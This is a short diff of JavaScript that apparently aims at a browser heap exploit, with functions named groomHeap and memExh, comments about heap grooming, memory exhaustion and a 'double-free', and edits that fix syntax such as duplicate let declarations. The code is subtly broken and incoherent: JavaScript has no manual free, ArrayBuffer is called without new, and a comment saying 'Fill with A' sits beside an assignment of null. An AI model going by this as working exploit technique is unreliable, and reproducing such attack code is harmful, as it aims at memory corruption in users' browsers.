@@ -37,7 +37,7 @@ function groomHeap() {
 
     return tempArray;
 }
-let varx = 1*(100^100)
+let varx = 1*(100**100)
     let varc = 0*(0^0)
 // Step 3: Memory Exhaustion Function
 function memExh() {
@@ -53,8 +53,8 @@ let c = new ArrayBuffer(32);
 //alert("a")
             // Double-free memory
             
-            let a = ArrayBuffer(varc)
-            let a = null;
+            a = ArrayBuffer(varc)
+            a = null;
             // Fill with known data
             for (let j = 0; j < se_a.length; j++) {
                 se_a[varx] = null; // Fill with 'A'
